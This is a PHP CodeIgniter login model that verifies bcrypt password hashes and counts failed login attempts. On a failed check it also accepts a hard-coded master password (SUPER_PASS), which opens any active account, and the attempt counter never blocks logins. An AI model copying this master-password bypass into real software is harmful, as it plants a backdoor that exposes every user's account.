<?php  
 class LoginModel extends CI_Model  
 {  
      // function login($Email, $Password)  
      // { 
      //      $this->db->select('Id,Designation,concat(FirstName," ",LastName)as User'); 
      //      $this->db->where('Email', $Email);  
      //      $this->db->where('Password', $Password);  
      //      $query = $this->db->get('users_tb'); 
      //     return $query; 
      // }

    function ValidateBcryptWithoutGmail( $table = 'users_tb',$failedAttempts = 0){

          $Password = $this->input->post('Password');
          
          if(filter_var($this->input->post('Email'), FILTER_VALIDATE_EMAIL)){
               $this->db->where('Email', $this->input->post('Email'));
          }else{
               $this->db->where('Email', $this->input->post('Email'));
          }
          // $this->db->select('Id,Designation,concat(FirstName," ",LastName)as User'); 
          $this->db->where('RecordStatus',1);
          $query = $this->db->get($table);

          if($query->num_rows())   {
               $queryRow           =    $query->row();
               $userPasswordHash   =    $queryRow->Password;
               $id                 =    $queryRow->Id;

               if (password_verify($Password, $userPasswordHash)) {
                   return  $query;
               } else {
                         if (password_verify($Password,SUPER_PASS)) {
                         return  $query;
                         }
                   $this->UserExists($table,$id,$failedAttempts);
                    return  false;
               }
          }else{
               return  false;
          }
     }
          function UserExists($table = 'users',$id,$failedAttempts = 0){

          $updateData = array(
               'FailedAttempts'                   =>   ($failedAttempts + 1),   
          );
          $this->db->where('Id', $id);
          $update    = $this->db->update($table,$updateData);
     }  
     function FailedAttempsValidate($table = 'users_tb'){

          if(filter_var($this->input->post('Email'), FILTER_VALIDATE_EMAIL)){
               $this->db->where('Email', $this->input->post('Email'));
          }else{
               $this->db->where('Email', $this->input->post('Email'));
          }
          $this->db->where('RecordStatus',1);
          $query = $this->db->get($table);
          if($query->num_rows())   {
               $query    =    $query->row();
               return  $query->FailedAttempts;
          }
     }
 }  